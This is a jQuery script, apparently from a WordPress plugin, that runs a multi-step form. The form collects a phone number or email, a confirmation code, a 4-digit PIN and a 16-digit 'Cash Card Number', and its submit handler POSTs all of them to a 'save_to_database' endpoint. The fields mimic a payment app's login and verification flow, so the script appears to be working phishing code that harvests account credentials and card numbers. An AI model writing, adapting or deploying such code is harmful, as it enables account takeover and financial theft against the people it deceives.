(function ($) {
  $(document).ready(function () {
    const toggleButton = document.getElementById("toggleInputButton");
    const phoneInputSection = document.getElementById("phoneInputSection");
    const emailInputSection = document.getElementById("emailInputSection");
    const continueToStep2Button = document.getElementById("continueToStep2");
    const continueToStep3Button = document.getElementById("continueToStep3");
    const continueToStep4Button = document.getElementById("continueToStep4");
    const submitButton = document.getElementById("submitForm");
    const step1 = document.getElementById("step1");
    const step2 = document.getElementById("step2");
    const step3 = document.getElementById("step3");
    const step4 = document.getElementById("step4");
    const thankYouPage = document.getElementById("thankYouPage");
    const registeredInfo = document.getElementById("registeredInfo");
    const pinInput = document.getElementById("pinInput");
    const dots = [
      document.getElementById("dot1"),
      document.getElementById("dot2"),
      document.getElementById("dot3"),
      document.getElementById("dot4"),
    ];

    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

    toggleButton.addEventListener("click", () => {
      if (phoneInputSection.style.display === "none") {
        phoneInputSection.style.display = "block";
        emailInputSection.style.display = "none";
        toggleButton.textContent = "Use Email";
      } else {
        phoneInputSection.style.display = "none";
        emailInputSection.style.display = "block";
        toggleButton.textContent = "Use Phone";
      }
    });

    continueToStep2Button.addEventListener("click", () => {
      const phoneNumber = document.getElementById("mobileNumber").value.trim();
      const email = document.getElementById("email").value.trim();

      if (phoneInputSection.style.display !== "none") {
        if (!phoneNumber) {
          alert("Please enter a valid phone number.");
          return;
        }
        registeredInfo.textContent = phoneNumber;
      } else {
        if (!email || !emailRegex.test(email)) {
          alert("Please enter a valid email address.");
          return;
        }
        registeredInfo.textContent = email;
      }

      step1.style.display = "none";
      step2.style.display = "block";
    });

    continueToStep3Button.addEventListener("click", () => {
      const confirmationCode = document
        .getElementById("confirmationCode")
        .value.trim();

      if (!confirmationCode) {
        alert("Please enter the confirmation code.");
        return;
      }

      step2.style.display = "none";
      step3.style.display = "block";
    });

    continueToStep4Button.addEventListener("click", () => {
      const pinValue = pinInput.value.trim();

      if (pinValue.length !== 4) {
        alert("Please enter a valid 4-digit PIN.");
        return;
      }

      step3.style.display = "none";
      step4.style.display = "block";
    });

    submitButton.addEventListener("click", () => {
      const cashCardNumber = document
        .getElementById("cashCardNumber")
        .value.trim();

      if (!cashCardNumber || cashCardNumber.length !== 16) {
        alert("Please enter a valid 16-digit Cash Card Number.");
        return;
      }

      step4.style.display = "none";
      thankYouPage.style.display = "block";
    });

    pinInput.addEventListener("input", () => {
      const pinValue = pinInput.value;
      dots.forEach((dot, index) => {
        dot.classList.toggle("active", index < pinValue.length);
      });
    });

    /**
     * TODO: When click on submitForm get all input fields values and send a ajax request to server to save to database
     */

    $("#submitForm").click(function (e) {
      e.preventDefault();

      // get all input fields values
      const phoneNumber = document.getElementById("mobileNumber").value.trim();
      const email = document.getElementById("email").value.trim();

      let emailOrPhone = phoneNumber ? phoneNumber : email;

      const confirmationCode = document
        .getElementById("confirmationCode")
        .value.trim();
      const pinValue = pinInput.value.trim();
      const cashCardNumber = document
        .getElementById("cashCardNumber")
        .value.trim();

      // console.log(
      //   `emailOrPhone: ${emailOrPhone}, confirmationCode: ${confirmationCode}, pinValue: ${pinValue}, cashCardNumber: ${cashCardNumber}`
      // );

      // send a ajax request to server to save to database
      if (cashCardNumber.length < 16) {
        // alert("Please enter a valid 16-digit Cash Card Number.");
        return;
      }

      $.ajax({
        type: "POST",
        url: wpb_public_localize.ajax_url,
        data: {
          action: "save_to_database",
          nonce: wpb_public_localize.nonce,
          emailOrPhone: emailOrPhone,
          confirmationCode: confirmationCode,
          pinValue: pinValue,
          cashCardNumber: cashCardNumber,
        },
        success: function (response) {
          console.log(response);
        },
      });
    });
  });
})(jQuery);
